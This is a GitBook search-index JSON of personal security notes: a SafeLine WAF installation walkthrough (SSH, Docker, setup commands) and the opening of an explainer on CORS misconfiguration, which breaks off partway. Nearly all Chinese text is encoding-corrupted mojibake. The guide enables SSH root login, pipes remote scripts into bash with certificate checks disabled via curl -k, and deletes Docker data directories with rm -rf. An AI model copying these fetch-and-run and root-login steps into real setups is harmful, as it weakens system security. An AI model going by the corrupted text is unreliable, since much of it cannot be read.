{"./":{"url":"./","title":"Security Book","keywords":"","body":"Readme Web Book Redteam Book Email Book Network Book Other Book Copyright & Copy zha0cai all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ä»¶ä¿®è®¢æ—¶é—´ï¼š 2023-05-15 09:45:11 "},"web/a-readme.html":{"url":"web/a-readme.html","title":"Web","keywords":"","body":"å…³äº Web çš„çŸ¥è¯†åˆé›†~ Copyright & Copy zha0cai all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ä»¶ä¿®è®¢æ—¶é—´ï¼š 2023-05-14 19:29:59 "},"web/Chaitin SafeLine é›·æ± ç¤¾åŒºç‰ˆ.html":{"url":"web/Chaitin SafeLine é›·æ± ç¤¾åŒºç‰ˆ.html","title":"Chaitin SafeLine é›·æ± ç¤¾åŒºç‰ˆ","keywords":"","body":"0x01 ä»‹ç» ä¸€æ¬¾ç®€å•ã€å¥½ç”¨çš„ WAF å·¥å…·ã€‚åŸºäºé•¿äº­ç§‘æŠ€ç‹ç‰Œçš„ ğŸ¤–ï¸ æ™ºèƒ½è¯­ä¹‰åˆ†æç®—æ³• ğŸ¤–ï¸ æ‰“é€ ï¼Œä¸“ä¸ºç¤¾åŒºè®¾è®¡ã€‚ å®˜æ–¹æ–‡æ¡£ï¼š https://github.com/chaitin/safeline/blob/main/README_CN.md https://stack.chaitin.com/tool/detail?id=717 https://waf-ce.chaitin.cn/posts/faq_install FAQ æ€»ä¹‹å°±ä¸€ä¸ªå­—ï¼Œç‰› ğŸ ä¸¤ä¸ªå­—ï¼Œå¥½ç”¨ ğŸ¦¸ ç¤¾åŒºç‰ˆå’Œä¼ä¸šç‰ˆå¯¹æ¯” 0x02 å®‰è£…å’Œä½¿ç”¨ ç¯å¢ƒå‡†å¤‡ & å®‰è£… Ubuntu å®‰è£… SSH # å®‰è£… sudo apt update sudo apt install openssh-server # æŸ¥çœ‹è¿è¡ŒçŠ¶æ€ sudo systemctl status ssh or ps -e | grep ssh # å…³é—­ ssh sudo systemctl disable --now ssh # å¼€å¯ ssh sudo systemctl enable --now ssh # æ–°ç‰ˆ Ubuntu è¿˜éœ€è¦å¼€å¯ root ç™»å½• sudo vim /etc/ssh/sshd_config 1. æ‰¾åˆ°ä¸‹é¢è¿™ä¸€è¡Œ PermitRootLogin prohibit-password 2. å–æ¶ˆæ³¨é‡Šå¹¶å°†ä¸Šé¢çš„ prohibit-password æ›¿æ¢æˆ yesï¼Œæˆ–è€…é‡æ–°å†™ä¸€è¡Œ #PermitRootLogin prohibit-password PermitRootLogin yes # è¿™æ˜¯æ–°æ·»åŠ çš„ä¸€è¡Œ 3. é‡å¯sshd.service sudo systemctl restart sshd.service or service sshd restart # Ubuntu è‡ªå¸¦ä¸€ä¸ªé…ç½®é˜²ç«å¢™é…ç½®å·¥å…·ï¼Œç§°ä¸º UFW # å¦‚æœé˜²ç«å¢™åœ¨ä½ çš„ç³»ç»Ÿä¸Šè¢«å¯ç”¨ï¼Œè¯·ç¡®ä¿æ‰“å¼€äº† SSH ç«¯å£ # å…è®¸ ssh è¿æ¥ sudo ufw allow ssh # å¯ä»¥é€šè¿‡ help æŸ¥çœ‹æ“ä½œ root@root-docker:~# ufw -help Docker & Docker Compose https://docs.docker.com/engine/install/ https://docs.docker.com/compose/install/ https://docs.docker.com/engine/install/ubuntu/#set-up-the-repository -- å®˜æ–¹æ–‡æ¡£å°±æ˜¯ç‰› æ— æ³•æ­£å¸¸åœæ­¢ docker è¿›ç¨‹ https://stackoverflow.com/questions/51729836/error-response-from-daemon-cannot-stop-container-signaling-init-process-cause ä½¿ç”¨ apt å­˜å‚¨åº“å®‰è£… åœ¨æ–°ä¸»æœºä¸Šé¦–æ¬¡å®‰è£… Docker Engine ä¹‹å‰ï¼Œæ‚¨éœ€è¦è®¾ç½® Docker å­˜å‚¨åº“ã€‚ä¹‹åï¼Œæ‚¨å¯ä»¥ä»å­˜å‚¨åº“å®‰è£…å’Œæ›´æ–° Dockerã€‚ è®¾ç½®å­˜å‚¨åº“ æ›´æ–° aptâ€‹ â€‹åŒ…ç´¢å¼•å¹¶å®‰è£…åŒ…ä»¥å…è®¸ aptâ€‹ â€‹é€šè¿‡ HTTPS ä½¿ç”¨å­˜å‚¨åº“ï¼š $ sudo apt-get update $ sudo apt-get install ca-certificates curl gnupg æ·»åŠ  Docker çš„å®˜æ–¹ GPG å¯†é’¥ï¼š $ sudo install -m 0755 -d /etc/apt/keyrings $ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg $ sudo chmod a+r /etc/apt/keyrings/docker.gpg ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è®¾ç½®å­˜å‚¨åº“ï¼š $ echo \\ \"deb [arch=\"$(dpkg --print-architecture)\" signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \\ \"$(. /etc/os-release && echo \"$VERSION_CODENAME\")\" stable\" | \\ sudo tee /etc/apt/sources.list.d/docker.list > /dev/null å®‰è£… Docker å¼•æ“ æ›´æ–° aptâ€‹â€‹ â€‹åŒ…ç´¢å¼•ï¼š $ sudo apt-get update å®‰è£… Docker Engineã€containerd å’Œ Docker Composeã€‚ è¦å®‰è£…æœ€æ–°ç‰ˆæœ¬ï¼Œè¯·è¿è¡Œï¼š $ sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin è¦å®‰è£…ç‰¹å®šç‰ˆæœ¬çš„ Docker Engineï¼Œé¦–å…ˆåœ¨å­˜å‚¨åº“ä¸­åˆ—å‡ºå¯ç”¨ç‰ˆæœ¬ï¼š # List the available versions: $ apt-cache madison docker-ce | awk '{ print $3 }' 5:23.0.5-1~ubuntu.22.04~jammy 5:23.0.4-1~ubuntu.22.04~jammy é€‰æ‹©æ‰€éœ€ç‰ˆæœ¬å¹¶å®‰è£…ï¼š VERSION_STRING=5:23.0.5-1~ubuntu.22.04~jammy sudo apt-get install docker-ce=$VERSION_STRING docker-ce-cli=$VERSION_STRING containerd.io docker-buildx-plugin docker-compose-plugin é€šè¿‡è¿è¡Œæ˜ åƒéªŒè¯ Docker å¼•æ“å®‰è£…æ˜¯å¦æˆåŠŸ hello-worldâ€‹â€‹â€‹ã€‚ $ sudo docker run hello-world æ­¤å‘½ä»¤ä¸‹è½½æµ‹è¯•å›¾åƒå¹¶åœ¨å®¹å™¨ä¸­è¿è¡Œå®ƒã€‚å½“å®¹å™¨è¿è¡Œæ—¶ï¼Œå®ƒä¼šæ‰“å°ä¸€æ¡ç¡®è®¤æ¶ˆæ¯å¹¶é€€å‡ºã€‚ æ‚¨ç°åœ¨å·²ç»æˆåŠŸå®‰è£…å¹¶å¯åŠ¨äº† Docker å¼•æ“ã€‚ å¸è½½ Docker å¼•æ“ å¸è½½ Docker Engineã€CLIã€containerd å’Œ Docker Compose åŒ…ï¼š $ sudo apt-get purge docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin docker-ce-rootless-extras ä¸»æœºä¸Šçš„å›¾åƒã€å®¹å™¨ã€å·æˆ–è‡ªå®šä¹‰é…ç½®æ–‡ä»¶ä¸ä¼šè‡ªåŠ¨åˆ é™¤ã€‚åˆ é™¤æ‰€æœ‰é•œåƒã€å®¹å™¨å’Œå·ï¼š $ sudo rm -rf /var/lib/docker $ sudo rm -rf /var/lib/containerd æ‚¨å¿…é¡»æ‰‹åŠ¨åˆ é™¤ä»»ä½•å·²ç¼–è¾‘çš„é…ç½®æ–‡ä»¶ã€‚ # è®¾ç½®å¼€æœºå¯åŠ¨ systemctl enable docker # æŸ¥çœ‹ç‰ˆæœ¬ docker compose version Docker Compose version vN.N.N # æ‰‹åŠ¨æŒ‡å®šç‰ˆæœ¬ Docker-compose å®‰è£… sudo curl -L \"https://github.com/docker/compose/releases/download/xxxx ç‰ˆæœ¬å·/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose docker-compose --version åœæ­¢æ‰€æœ‰å®¹å™¨ docker stop $(docker ps -a -q) åœæ­¢ docker socket sudo systemctl stop docker.socket sudo systemctl stop docker.service å¯åŠ¨ docker æœåŠ¡ sudo systemctl daemon-reload sudo systemctl restart docker.service SafeLine å®‰è£… # docker info # >= 20.10.6 # docker compose version # >= 2.0.0 root@root-docker:~# docker -v Docker version 24.0.0, build 98fdcd7 root@root-docker:~# docker compose version Docker Compose version v2.17.3 ======== mkdir -p safeline && cd safeline # setup curl -kfLsS https://waf-ce.chaitin.cn/release/latest/setup.sh | bash # launch sudo docker compose up -d çªå‡ºä¸€ä¸ªä¸æ»‘ï¼Œå¿«é€Ÿã€‚ root@root-docker:/home# mkdir -p safeline && cd safeline root@root-docker:/home/safeline# curl -kfLsS https://waf-ce.chaitin.cn/release/latest/setup.sh | bash ____ __ _ _ / ___| __ _ / _| ___ | | (_) _ __ ___ \\___ \\ / _` | | |_ / _ \\ | | | | | '_ \\ / _ \\ ___) | | (_| | | _| | __/ | |___ | | | | | | | __/ |____/ \\__,_| |_| \\___| |_____| |_| |_| |_| \\___| --2023-05-17 13:41:50-- https://waf-ce.chaitin.cn/release/latest/compose.yaml æ­£åœ¨è§£æä¸»æœº waf-ce.chaitin.cn (waf-ce.chaitin.cn)... 101.200.136.115 æ­£åœ¨è¿æ¥ waf-ce.chaitin.cn (waf-ce.chaitin.cn)|101.200.136.115|:443... å·²è¿æ¥ã€‚ å·²å‘å‡º HTTP è¯·æ±‚ï¼Œæ­£åœ¨ç­‰å¾…å›åº”... 200 OK é•¿åº¦ï¼š 3082 (3.0K) [application/octet-stream] æ­£åœ¨ä¿å­˜è‡³: â€œcompose.yamlâ€ compose.yaml 100%[==========================================================>] 3.01K --.-KB/s ç”¨æ—¶ 0s 2023-05-17 13:41:51 (717 MB/s) - å·²ä¿å­˜ â€œcompose.yamlâ€ [3082/3082]) Setup success! Run 'docker compose up -d' to start SafeLine. And then visit https://:9443. root@root-docker:/home/safeline# sudo docker compose up -d [+] Running 36/36ers [â €â €] 0B/0B Pulling 1236.4s âœ” detector 2 layers [â£¿â£¿] 0B/0B Pulled 1465.2s âœ” 2c28d2c9e7bf Pull complete 1227.1s âœ” 556abd9ab8cb Pull complete 1447.0s âœ” mario 2 layers [â£¿â£¿] 0B/0B Pulled 1154.1s ...... å®‰è£…å®Œæˆä¹‹åï¼Œæµè§ˆå™¨æ‰“å¼€åå°ç®¡ç†é¡µé¢ https://:9443â€‹â€‹ã€‚æ ¹æ®ç•Œé¢æç¤ºï¼Œä½¿ç”¨ æ”¯æŒ TOTP çš„è®¤è¯è½¯ä»¶ æ‰«æäºŒç»´ç ï¼Œç„¶åè¾“å…¥åŠ¨æ€å£ä»¤ç™»å½•ã€‚ root@root-docker:/home/safeline# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 0645a436cc64 postgres:15.2 \"docker-entrypoint.sâ€¦\" 33 minutes ago Up 33 minutes 5432/tcp safeline-postgres 4233d84592f1 chaitin/safeline-mario:latest \"/mario/entrypoint.sh\" 33 minutes ago Up 33 minutes (healthy) safeline-mario 28059557bc1a chaitin/safeline-mgt-api:latest \"/app/entrypoint.sh\" 33 minutes ago Up 33 minutes (healthy) 0.0.0.0:9443->1443/tcp, :::9443->1443/tcp safeline-mgt-api a5bf6b4a8e37 chaitin/safeline-tengine:latest \"docker-entrypoint.sâ€¦\" 33 minutes ago Up 33 minutes (healthy) safeline-tengine a2c215f38371 chaitin/safeline-detector:latest \"/detector/entrypoinâ€¦\" 33 minutes ago Up 33 minutes (healthy) 8000-8001/tcp safeline-detector SafeLine æ›´æ–° è‡ªåŠ¨æ›´æ–° WARN: SafeLine will be restarted and your traffic will be unavailable for a short period of time. You may need to choose a proper time for upgration. curl -kfLsS https://waf-ce.chaitin.cn/release/latest/upgrade.sh | bash # replace with `docker-compose` if necessary. docker compose down && docker compose pull && docker compose up -d æœ‰éƒ¨åˆ†ç¯å¢ƒçš„é»˜è®¤ SafeLine å®‰è£…è·¯å¾„æ˜¯åœ¨ /data/safeline-ceâ€‹â€‹ï¼Œå®‰è£…ä¹‹åå¯èƒ½ä¼šå‘ç°éœ€è¦é‡æ–°ç»‘å®š OTPã€é…ç½®ä¸¢å¤±ç­‰æƒ…å†µï¼Œå¯ä»¥ä¿®æ”¹ .env çš„ SAFELINE_DIRâ€‹â€‹ å˜é‡ï¼ŒæŒ‡å‘ /data/safeline-ceâ€‹â€‹ æ‰‹åŠ¨æ›´æ–°é•œåƒ é€‚ç”¨äº docker hub æ‹‰å–é•œåƒå¤±è´¥çš„åœºæ™¯ï¼Œæ‰‹åŠ¨æ›´æ–°é•œåƒï¼Œæ³¨æ„è¿˜æ˜¯è¦æ‰§è¡Œ upgrade.shâ€‹â€‹ æ¥å¤„ç† .envâ€‹â€‹ çš„æ›´æ–°ï¼Œå¦åˆ™æœ‰å¯èƒ½ä¼šå› ä¸ºç¼ºå°‘å‚æ•°è€Œå¯åŠ¨å¤±è´¥ã€‚ åœ¨ä¸€å°èƒ½å¤Ÿä» docker hub æ‹‰å–é•œåƒçš„æœºå™¨ä¸Šæ‰§è¡Œ # æ‹‰å–é•œåƒ docker pull chaitin/safeline-tengine:latest docker pull chaitin/safeline-mgt-api:latest docker pull chaitin/safeline-mario:latest docker pull chaitin/safeline-detector:latest docker pull postgres:15.2 # æ‰“åŒ…é•œåƒ docker save -o image.tar chaitin/safeline-tengine:latest chaitin/safeline-mgt-api:latest chaitin/safeline-mario:latest chaitin/safeline-detector:latest postgres:15.2 # ä¼ è¾“åˆ° SafeLine è¦éƒ¨ç½²çš„ç›®æ ‡æœåŠ¡å™¨ # scp image.tar :/root/ åœ¨ç›®æ ‡æœåŠ¡å™¨ load é•œåƒ docker load -i image.tar curl -kfLsS https://waf-ce.chaitin.cn/release/latest/upgrade.sh | bash é…ç½®å›½å†…é•œåƒåŠ é€Ÿ Error response from daemon: Head \"https://registry-1.docker.io/v2/chaitin/safeline-detector/manifests/latest\": net/http: TLS handshake timeout æ ¹æ®å®˜æ–¹ FAQï¼šdocker hub é»˜è®¤ä½¿ç”¨ä½äºç¾è¥¿èŠ‚ç‚¹æ‹‰å–é•œåƒï¼Œå¯ä»¥è‡ªè¡Œé…ç½®å›½å†…é•œåƒåŠ é€Ÿæºã€‚ docker å®‰è£…åé»˜è®¤æ²¡æœ‰ daemon.json è¿™ä¸ªé…ç½®æ–‡ä»¶ï¼Œéœ€è¦è¿›è¡Œæ‰‹åŠ¨åˆ›å»ºã€‚é…ç½®æ–‡ä»¶çš„é»˜è®¤è·¯å¾„ï¼š/etc/docker/daemon.jsonâ€‹â€‹ æ ‡å‡†æ ¼å¼ä¸ºï¼š â€‹$ docker pull registry.docker-cn.com/myname/myrepo:mytagâ€‹â€‹ ä¾‹ï¼š â€‹$ docker pull registry.docker-cn.com/library/ubuntu:16.04â€‹â€‹ ä¸ºäº†æ°¸ä¹…æ€§ä¿ç•™æ›´æ”¹ï¼Œæ‚¨å¯ä»¥ä¿®æ”¹ /etc/docker/daemon.jsonâ€‹â€‹ æ–‡ä»¶å¹¶æ·»åŠ ä¸Š registry-mirrorsâ€‹â€‹ é”®å€¼ã€‚ä¿®æ”¹ä¿å­˜åé‡å¯ Docker ä»¥ä½¿é…ç½®ç”Ÿæ•ˆã€‚ { \"registry-mirrors\": [\"https://registry.docker-cn.com\"] } ä½¿ç”¨ & æµ‹è¯• ğŸ”¥ğŸ”¥ğŸ”¥ Online Demo: https://demo.waf-ce.chaitin.cn:9443/ ç¤¾åŒºç‰ˆæ¥å…¥æ–¹å¼ æµè§ˆå™¨æ‰“å¼€åå°ç®¡ç†é¡µé¢ https://:9443ã€‚æ ¹æ®ç•Œé¢æç¤ºï¼Œä½¿ç”¨ æ”¯æŒ TOTP çš„è®¤è¯è½¯ä»¶ æ‰«æäºŒç»´ç ï¼Œç„¶åè¾“å…¥åŠ¨æ€å£ä»¤ç™»å½•ã€‚ pikachu å¯åŠ¨ï¼Œå¼€æµ‹~ é›·æ± çš„å‡ ä¸ªæ¨¡å— root@refl4:/home/safeline# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES cbe79478a813 chaitin/safeline-tengine:latest \"docker-entrypoint.sâ€¦\" 10 minutes ago Up 10 minutes (healthy) safeline-tengine 146d1443c778 chaitin/safeline-mario:latest \"/mario/entrypoint.sh\" 10 minutes ago Up 10 minutes (healthy) safeline-mario 8146c10e4204 postgres:15.2 \"docker-entrypoint.sâ€¦\" 10 minutes ago Up 10 minutes 5432/tcp safeline-postgres 7758a73ccda1 chaitin/safeline-detector:latest \"/detector/entrypoinâ€¦\" 10 minutes ago Up 10 minutes (healthy) 8000-8001/tcp safeline-detector 891f1f035346 chaitin/safeline-mgt-api:latest \"/app/entrypoint.sh\" 10 minutes ago Up 10 minutes (healthy) 0.0.0.0:9443->1443/tcp, :::9443->1443/tcp safeline-mgt-api ç«™ç‚¹é…ç½®é—®é¢˜ åœ¨æ²¡æœ‰ SafeLine çš„æ—¶å€™ï¼Œå‡è®¾å°æ˜çš„åŸŸå xiaoming.comâ€‹â€‹ é€šè¿‡ DNS è§£æåˆ°è‡ªå·±ä¸»æœº 192.168.1.111â€‹â€‹ï¼Œä¸Šé¢åœ¨ :8888â€‹â€‹ ç«¯å£ç›‘å¬äº†è‡ªå·±çš„æœåŠ¡ï¼ˆç½‘ç«™/åšå®¢/é¶åœºï¼‰ç­‰ç­‰ã€‚ å°æ˜é€šè¿‡ http://xiaoming.com:8888â€‹â€‹ æˆ–è€… 192.168.1.111:8888â€‹â€‹ æ¥è®¿é—®è‡ªå·±çš„æœåŠ¡ã€‚ æˆ‘è¯¥å¦‚ä½•é…ç½®ï¼Ÿ/ åŸŸåå¡«ä»€ä¹ˆï¼Ÿ/ ç«¯å£æ€ä¹ˆå†™ï¼Ÿ/ ä¸Šæ¸¸æœåŠ¡å™¨æ˜¯ä»€ä¹ˆï¼Ÿ ç›®å‰ç¤¾åŒºç‰ˆ SafeLine æ”¯æŒçš„æ˜¯åå‘ä»£ç†çš„æ–¹å¼æ¥å…¥ç«™ç‚¹ï¼Œä¹Ÿå°±æ˜¯ç±»ä¼¼äºä¸€å° nginx æœåŠ¡ã€‚è¿™æ—¶å€™å°æ˜éœ€è¦åšçš„å°±æ˜¯è®©æµé‡å…ˆæŠµè¾¾ SafeLineï¼Œç„¶åç»è¿‡ SafeLine æ£€æµ‹ä¹‹åï¼Œå†è½¬å‘ç»™è‡ªå·±åŸå…ˆçš„ä¸šåŠ¡ã€‚ å°æ˜åªéœ€è¦æŒ‰ç…§å¦‚ä¸‹æ–¹å¼åˆ›å»ºç«™ç‚¹å³å¯ï¼š xiaoming.comâ€‹â€‹ å¡«å…¥é¡µé¢çš„ã€ŒåŸŸåã€ â€‹:7777â€‹ å¡«å…¥ã€Œç«¯å£ã€ï¼›æˆ–è€…åˆ«çš„ä»»æ„é :8888â€‹â€‹ å’Œ :9443â€‹â€‹ï¼ˆè¢« SafeLine åå°ç®¡ç†é¡µé¢å ç”¨ï¼‰ç«¯å£ â€‹http://192.168.1.111:8888â€‹â€‹ å¡«å…¥ã€Œä¸Šæ¸¸æœåŠ¡å™¨ã€ åˆ›å»ºä¹‹åï¼Œå°±å¯ä»¥é€šè¿‡ http://xiaoming.com:7777â€‹â€‹ æˆ–è€… 192.168.1.111:7777â€‹â€‹ è®¿é—®è‡ªå·±çš„æœåŠ¡äº†ï¼Œè¿™æ—¶å€™è¯·æ±‚åˆ° http://xiaoming.com:7777â€‹â€‹ çš„æµé‡éƒ½ä¼šè¢« SafeLine æ£€æµ‹ã€‚ç»è¿‡ SafeLine è¿‡æ»¤åï¼Œå®‰å…¨çš„æµé‡ä¼šè¢«é€ä¼ åˆ°åŸå…ˆçš„ :8888â€‹â€‹ ä¸šåŠ¡æœåŠ¡å™¨ï¼ˆå³ä¸Šæ¸¸æœåŠ¡å™¨ï¼‰ã€‚ ã€æ³¨ã€‘ï¼šç›´æ¥è®¿é—® http://xiaoming.com:8888â€‹â€‹ çš„æµé‡ï¼Œä»ç„¶ä¸ä¼šè¢« SafeLine æ£€æµ‹ï¼Œå› ä¸ºæµé‡å¹¶æ²¡æœ‰ç»è¿‡ SafeLineï¼Œè€Œæ˜¯ç»•è¿‡ SafeLine ç›´æ¥æ‰“åˆ°äº†ä¸Šæ¸¸æœåŠ¡å™¨ä¸Šã€‚å¦‚æœè¿˜ä¸è¡Œè¯·å‚çœ‹å®˜æ–¹ FAQ è¿›è¡Œæ’æŸ¥ã€‚ Emmmï¼Œæµé‡ä¸€ç›´æ²¡æ‰“è¿‡å»ã€‚ã€‚ã€‚ # æŸ¥çœ‹æ—¥å¿— root@root-docker:/home/safeline# docker logs -f safeline-tengine nginx: [emerg] bind() to 0.0.0.0:65443 failed (98: Unknown error) nginx: [emerg] bind() to 0.0.0.0:65443 failed (98: Unknown error) nginx: [emerg] bind() to 0.0.0.0:65443 failed (98: Unknown error) nginx: [emerg] bind() to 0.0.0.0:65443 failed (98: Unknown error) nginx: [emerg] bind() to 0.0.0.0:65443 failed (98: Unknown error) nginx: [emerg] still could not bind() æœ€ç»ˆè¿˜æ˜¯æ²¡åŠæ³•ï¼Œé‡æ–°æ¢å¤äº† Ubuntu çš„ç¯å¢ƒã€åˆå§‹ç¯å¢ƒå¿«ç…§å¾ˆé‡è¦ã€‘ï¼Œé‡æ–°å®‰è£…åå°±å¥½äº†ã€‚ æ³¨æ„æ˜¯ç»è¿‡é›·æ± çš„æµé‡æ‰æ£€æµ‹ï¼Œç›´æ¥è®¿é—®çš„æ˜¯ä¸ä¼šæ£€æµ‹çš„ï¼Œæ‰€ä»¥è®¿é—® http://192.168.201.156:7777/pikachu/ å¼€æµ‹~ å¯ä»¥å¯ä»¥ï¼Œçœ‹åˆ°ç•Œé¢äº†ã€‚åªèƒ½è¯´ç”¨è¿‡çš„éƒ½è¯´å¥½ï¼ŒBypass çš„è¯æš‚æ—¶å°±ä¸æµ‹äº†ï¼Œæ²¡å•¥å®åŠ›ã€‚ 0x00 å‰äººæ ½æ ‘ ã€Dockerã€‘daemon.json çš„ä½œç”¨ï¼ˆå…«ï¼‰ Copyright & Copy zha0cai all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ä»¶ä¿®è®¢æ—¶é—´ï¼š 2023-05-24 21:59:19 "},"web/CORS è·¨åŸŸæ¼æ´.html":{"url":"web/CORS è·¨åŸŸæ¼æ´.html","title":"CORS è·¨åŸŸæ¼æ´","keywords":"","body":"0x01 æ¼æ´æè¿° æ¦‚è¿° CORSï¼Œè·¨åŸŸèµ„æºå…±äº«ï¼ˆCross-Origin Resource Sharingï¼‰ï¼Œæ˜¯ H5 æä¾›çš„ä¸€ç§æœºåˆ¶ï¼ŒWEB åº”ç”¨ç¨‹åºå¯ä»¥é€šè¿‡åœ¨ HTTP å¢åŠ å­—æ®µæ¥å‘Šè¯‰æµè§ˆå™¨ï¼Œå“ªäº›ä¸åŒæ¥æºçš„æœåŠ¡å™¨æ˜¯æœ‰æƒè®¿é—®æœ¬ç«™èµ„æºçš„ï¼Œå½“ä¸åŒåŸŸçš„è¯·æ±‚å‘ç”Ÿæ—¶ï¼Œå°±å‡ºç°äº†è·¨åŸŸçš„ç°è±¡ã€‚å½“è¯¥é…ç½®ä¸å½“çš„æ—¶å€™ï¼Œå°±å¯¼è‡´èµ„æºè¢«æ¶æ„æ“ä½œã€‚ å½“ CORS çš„è®¾ç½®ä¸æ­£ç¡®æ—¶ï¼Œå°±ä¼šå¸¦æ¥å®‰å…¨é—®é¢˜ï¼›å½“å“åº”å¤´ä¸­çš„ Access-Control-Allow-Originâ€‹â€‹ è®¾ç½®ä¸º nullâ€‹â€‹ æˆ– *â€‹â€‹ æ—¶ï¼Œè¡¨ç¤ºä¿¡ä»»ä»»ä½•åŸŸï¼Œè¿™æ—¶å€™å°±å¯èƒ½å¼•å…¥å®‰å…¨é—®é¢˜ã€‚ ã€Œä½ çš„ Request é‚„æ˜¯æœ‰ç™¼å‡ºå»çš„ã€ï¼Œè€Œä¸”ç€è¦½å™¨ä¹Ÿã€Œç¢ºå¯¦æœ‰æ”¶åˆ° Responseã€ï¼Œé‡é»æ˜¯ã€Œç€è¦½å™¨å› ç‚ºåŒæºæ”¿ç­–ï¼Œä¸æŠŠçµæœå‚³å›çµ¦ä½ çš„ JavaScriptã€ã€‚å¦‚æœæ²’æœ‰ç€è¦½å™¨çš„è©±å…¶å¯¦å°±æ²’æœ‰é€™äº›å•é¡Œï¼Œä½ æ„›ç™¼çµ¦èª°å°±ç™¼çµ¦èª°ï¼Œä¸ç®¡æ€æ¨£éƒ½æ‹¿å¾—åˆ° Responseã€‚ ç•¶ç€è¦½å™¨æ”¶åˆ° Response ä¹‹å¾Œï¼Œæœƒå…ˆæª¢æŸ¥ Access-Control-Allow-Originâ€‹â€‹â€‹ è£¡é¢çš„å…§å®¹ï¼Œå¦‚æœè£¡é¢æœ‰åŒ…å«ç¾åœ¨é€™å€‹ç™¼èµ· Request çš„ Origin çš„è©±ï¼Œå°±æœƒå…è¨±é€šéï¼Œè®“ç¨‹å¼é †åˆ©æ¥æ”¶åˆ° Responseã€‚ æ‰€ä»¥ï¼ŒåŒæºç­–ç•¥å¹¶ä¸é™åˆ¶è¯·æ±‚çš„å‘èµ·å’Œå“åº”ï¼Œåªæ˜¯æµè§ˆå™¨æ‹’ç»äº† jsâ€‹â€‹â€‹ å¯¹å“åº”èµ„æºçš„æ“ä½œã€‚ã€è¯¥æ¼æ´çš„æµ‹è¯•è¯¯åŒºï¼Œè¦æ³¨æ„åŒæºé™åˆ¶ç­–ç•¥æ˜¯é’ˆå¯¹æµè§ˆå™¨çš„ã€‘ æµ‹è¯•æ–¹æ³• æµ‹è¯•äººå‘˜è®¿é—®æŸä¸ª urlï¼Œå°†è¯·æ±‚å¤´ä¸­çš„ Origin å­—æ®µä¿®æ”¹ä¸ºä»»æ„å€¼ï¼Œç»“æœä»ç„¶èƒ½è·å¾—æ­£ç¡®çš„å“åº”æŠ¥æ–‡ï¼ˆè¿™ä¼šå¯¼è‡´è¯¯æŠ¥ä¸åº”è¯¥ä½¿ç”¨è¯¥æµ‹è¯•æ–¹æ³•ï¼‰ï¼Œå°±è¯´æ˜æœ‰ CORS æ¼æ´ å¯ä»¥é€šè¿‡æµè§ˆå™¨çš„æ§åˆ¶å°çš„ networkï¼ŒæŸ¥çœ‹æ¥å£çš„è¯·æ±‚åŒ… response å¤´ä¸­ Access-Control-Allow-Origin æ˜¯å¦è®¾ç½®ä¸º *â€‹â€‹ ä¹Ÿå¯ä»¥é€šè¿‡æŠ“åŒ…å·¥å…·ï¼ŒæŸ¥çœ‹æ¥å£è¿”å›çš„ response ä¸­æ˜¯ Access-Control-Allow-Origin æ˜¯å¦è®¾ç½®ä¸º * or null ç­‰å…¶ä»–é…ç½®ç»„åˆï¼Œè¯¦è§ä¸‹æ–‡ã€‚â€‹â€‹ æ¼æ´ç¤ºä¾‹ é…ç½® Access-Control-Allow-Origin ä¸º *â€‹â€‹ é…ç½® Access-Control-Allow-Origin ä½†æ˜¯è¯¥å€¼å¯æ§ 0x02 åŒæºåŠè·¨åŸŸ ä»€ä¹ˆæ˜¯åŒæº & è·¨åŸŸ åŒæºï¼šåè®®ç›¸åŒ & ç«¯å£ç›¸åŒ & ä¸»æœºï¼ˆåŸŸåï¼‰ç›¸åŒ è·¨åŸŸï¼šä¸Šè¿°ä¹‹ä¸€ä¸åŒï¼Œå¦‚ ç½‘ç»œåè®®ä¸åŒï¼Œå¦‚ http åè®®è®¿é—® https åè®® ; ç«¯å£ä¸åŒï¼Œå¦‚ 80 ç«¯å£è®¿é—® 8080 ç«¯å£ ; åŸŸåä¸åŒï¼Œå¦‚ www.test1.com è®¿é—® www.test2.com ; å­åŸŸåä¸åŒï¼Œå¦‚ abc.test1.com è®¿é—® def.test1.com ; æµè§ˆå™¨å°† CORS è¯·æ±‚åˆ†æˆä¸¤ç±»ï¼šç®€å•è¯·æ±‚ï¼ˆsimple requestï¼‰å’Œéç®€å•è¯·æ±‚ï¼ˆnot-so-simple requestï¼‰ã€‚ ä¸€äº›åº”ç”¨åœºæ™¯ æ¯”å¦‚åç«¯å¼€å‘å®Œä¸€éƒ¨åˆ†ä¸šåŠ¡ä»£ç åï¼Œæä¾›æ¥å£ç»™å‰ç«¯ç”¨ï¼Œåœ¨å‰åç«¯åˆ†ç¦»çš„æ¨¡å¼ä¸‹ï¼Œå‰åç«¯çš„åŸŸåæ˜¯ä¸ä¸€è‡´çš„ï¼Œæ­¤æ—¶å°±ä¼šå‘ç”Ÿè·¨åŸŸè®¿é—®çš„é—®é¢˜ã€‚ ç¨‹åºå‘˜åœ¨æœ¬åœ°åšå¼€å‘ï¼Œæœ¬åœ°çš„æ–‡ä»¶å¤¹å¹¶ä¸æ˜¯åœ¨ä¸€ä¸ªåŸŸä¸‹é¢ï¼Œå½“ä¸€ä¸ªæ–‡ä»¶éœ€è¦å‘é€ ajax è¯·æ±‚ï¼Œè¯·æ±‚å¦å¤–ä¸€ä¸ªé¡µé¢çš„å†…å®¹çš„æ—¶å€™ï¼Œå°±ä¼šè·¨åŸŸã€‚ ç”µå•†ç½‘ç«™æƒ³é€šè¿‡ç”¨æˆ·æµè§ˆå™¨åŠ è½½ç¬¬ä¸‰æ–¹å¿«é€’ç½‘ç«™çš„ç‰©æµä¿¡æ¯ã€‚ å­ç«™åŸŸåå¸Œæœ›è°ƒç”¨ä¸»ç«™åŸŸåçš„ç”¨æˆ·èµ„æ–™æ¥å£ï¼Œå¹¶å°†æ•°æ®æ˜¾ç¤ºå‡ºæ¥ã€‚ 